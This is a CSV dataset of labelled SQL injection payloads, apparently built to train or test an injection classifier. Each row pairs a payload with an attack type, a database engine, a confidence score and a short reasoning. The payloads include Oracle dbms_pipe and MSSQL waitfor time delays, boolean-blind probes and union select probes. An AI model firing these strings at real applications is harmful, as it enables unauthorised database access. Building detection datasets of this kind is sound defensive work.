id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
1007,"1"" ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( ""fpkm"" like ""fpkm",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
1009,"1' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( 'vxqs' = 'vxqs",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
1032,"1%' ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
1059,"1"" ) as rgod where 5766 = 5766 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
1179,"1%"" ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
1008,"1', ( case when 5204 = 2136 then 1 else null end )",benign,generic,0.9,Signals: 'case'. Payload length: 50 chars.,2
1034,"-7084 ) where 2260 = 2260 or elt ( 1032 = 1032,3623 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
1037,"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
1061,1' waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
1156,1' in boolean mode ) waitfor delay '0:0:5'#,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
1005,"-9725' ) union all select 2481,2481,2481,2481,2481,2481,2481,2481,2481,2481--",union_based,generic,0.7,UNION-based payload detected. Payload length: 77 chars.,2
1006,"1"" where 1051 = 1051 union all select null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 44 chars.,2
1010,"-2225' union all select 1545,1545,1545,1545#",union_based,generic,0.7,UNION-based payload detected. Payload length: 44 chars.,2
1013,"1%' union all select null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 57 chars.,2
1014,-8410' ) ) ) or 8571 = 8571--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 29 chars.,2
1019,"1' union all select null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 40 chars.,2
1020,"1%' ) union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
